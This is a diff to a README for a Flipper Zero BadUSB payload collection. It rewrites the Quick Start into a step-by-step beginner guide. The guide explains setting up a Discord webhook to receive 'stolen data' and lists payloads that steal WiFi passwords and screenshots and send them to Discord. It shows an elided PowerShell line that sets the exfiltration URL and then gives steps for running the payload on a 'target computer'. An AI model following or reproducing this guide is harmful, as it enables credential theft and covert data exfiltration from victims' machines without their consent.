@@ -30,36 +30,63 @@
 
 ---
 
-## 🚀 Quick Start
+## 🚀 Quick Start (Complete Beginners)
 
-### 1. Get a Discord Webhook (for receiving data)
+**Never used Flipper BadUSB before?** Follow these 5 easy steps:
 
+### Step 1️⃣: Get a Discord Webhook
+
+**Why?** This is where your Flipper will send stolen data (WiFi passwords, screenshots, etc.)
+
+1. Open Discord and create/open any server
+2. Right-click the server name → **Server Settings**
+3. Click **Integrations** → **Webhooks** → **New Webhook**
+4. Click **Copy Webhook URL**  
+   ✅ You'll get something like: `https://discord.com/api/webhooks/1234567890/AbCdEf...`
+
+### Step 2️⃣: Pick a Payload
+
+**Start simple! Try these first:**
+
+| Payload | What it does | Needs Config? |
+|---------|-------------|---------------|
+| `payloads/windows/fun/rickroll.txt` | Opens Rick Roll video | ❌ No |
+| `payloads/windows/exfiltration/wifi_grabber.txt` | Steals WiFi passwords → Discord | ✅ Yes |
+| `payloads/windows/exfiltration/screenshot.txt` | Takes screenshot → Discord | ✅ Yes |
+
+**Tip**: Start with Rick Roll to test everything works!
+
+### Step 3️⃣: Configure (If Needed)
+
+Open your `.txt` file in **any text editor** (Notepad works fine)
+
+**Find this line:**
 ```
-Discord Server → Settings → Integrations → Webhooks → New Webhook → Copy URL
+STRING powershell ... '$env:DC='YOUR_DISCORD_WEBHOOK';...
 ```
 
-### 2. Pick a Payload
-
-Example: **WiFi Password Grabber** (`payloads/windows/exfiltration/wifi_grabber.txt`)
-
-### 3. Configure
-
-Open the `.txt` file and replace:
+**Change `YOUR_DISCORD_WEBHOOK` to your actual webhook:**
 ```
-YOUR_DISCORD_WEBHOOK → Your actual webhook URL
+STRING powershell ... '$env:DC='https://discord.com/api/webhooks/1234567890/AbCdEf...';...
 ```
 
-### 4. Copy to Flipper
+**That's it!** Save the file. ✅
 
-```
-SD Card/badusb/wifi_grabber.txt
-```
+### Step 4️⃣: Copy to Flipper
 
-### 5. Run
+Connect Flipper to your computer via USB:
 
-```
-Bad USB → wifi_grabber.txt → Run
-```
+1. Open **qFlipper** app (or use SD card reader)
+2. Navigate to: `SD Card` → `badusb` folder  
+   (Create `badusb` folder if it doesn't exist)
+3. **Drag and drop** your `.txt` file into `badusb/`
+
+### Step 5️⃣: Run on Target
+
+1. On Flipper: `Apps` → `Bad USB` → Select your payload
+2. Plug Flipper into target computer's USB port
+3. Press **OK button** on Flipper to run
+4. Check Discord for results! 🎉
 
 ---
 
